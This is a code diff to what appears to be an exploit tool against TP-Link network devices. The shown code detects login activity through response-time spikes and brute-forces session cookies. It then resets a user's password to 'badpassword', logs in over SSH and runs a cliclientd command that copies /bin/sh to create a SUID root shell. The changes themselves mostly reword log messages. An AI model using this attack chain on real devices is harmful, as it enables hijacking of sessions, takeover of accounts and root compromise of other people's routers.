@@ -168,7 +168,7 @@ class TPLinkCookieBrute:
 
         return cookie['value']
 
-    def detect_spike(self, threshold, hertz=10, sample_count=1, window=5):
+    def detect_spike(self, threshold, hertz=10, sample_count=1, window=10):
         """
         Look for spikes in response time above a threshold.
 
@@ -198,6 +198,8 @@ class TPLinkCookieBrute:
                 time.sleep(0.01)
 
             if sum(running) > 0:
+                if state['active']:
+                    logger.info('Spike Detected')
                 state['active'] = False
                 state['end'] = window
 
@@ -401,7 +403,7 @@ class EAPHTTPTool:
         logger.info('Changing the user password to `badpassword`')
         self.change_user(username, EAPHTTPTool._hash_password('badpassword'))
         # install our shell
-        logger.info('trying shell!')
+        logger.info('Attempting to login via SSH')
         try:
             with SSHClient() as client:
                 client.set_missing_host_key_policy(WarningPolicy)
@@ -411,7 +413,7 @@ class EAPHTTPTool:
                     username=username,
                     password='badpassword'
                 )
-                logger.info('got shell, attempt to privesc to root')
+                logger.info('Got a shell, creating a SUID sh')
                 # privesc from guest to root
                 client.exec_command('cliclientd tdb "-r cp /bin/sh /tmp/sh"')
                 time.sleep(1)
@@ -502,7 +504,7 @@ def exploit(host, admin_ip, implant, skip_vuln_check, tftpd_host, tftpd_port,
         start, end = cookie_cracker.detect_spike(threshold, hertz=hertz)
         # wait ~10 seconds or so they have a chance to login.
         logger.info(f'Found range {start}:{end}')
-        logger.info(f'Spike detected, waiting {wait_period} seconds')
+        logger.info(f'Waiting {wait_period} seconds to ensure a login')
         time.sleep(wait_period)
         logger.info(f'Starting cookie brute for range {start}:{end}')
         # See if we hit a valid range, or maybe just a random cpu spike.
